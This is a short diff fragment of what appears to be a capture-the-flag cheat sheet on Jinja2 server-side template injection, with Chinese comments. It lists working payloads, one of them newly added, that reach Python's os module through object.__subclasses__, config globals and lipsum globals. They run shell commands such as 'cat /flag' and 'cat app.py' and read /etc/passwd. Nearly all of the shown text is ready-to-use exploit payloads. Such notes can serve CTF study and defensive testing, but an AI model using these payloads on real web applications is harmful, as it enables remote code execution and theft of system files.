@@ -223,6 +223,7 @@ object.__subclasses__()[40]('/etc/passwd').read()
 #由于我们都是要获取object类。那么直接给他object类开头。就会简短很多
 {{ config.__class__.__init__.__globals__['os'].popen('cat /flag | base64').read() }}
 {{lipsum.__globals__[&quot;__builtins__&quot;][&quot;eval&quot;](&quot;__import__(&quot;os&quot;).popen(&quot;cat app.py&quot;).read()&quot;)}}
+{{lipsum.__globals__.__getitem__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()}}
 </code></pre>
 <pre><code>                                文件读取
 ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()
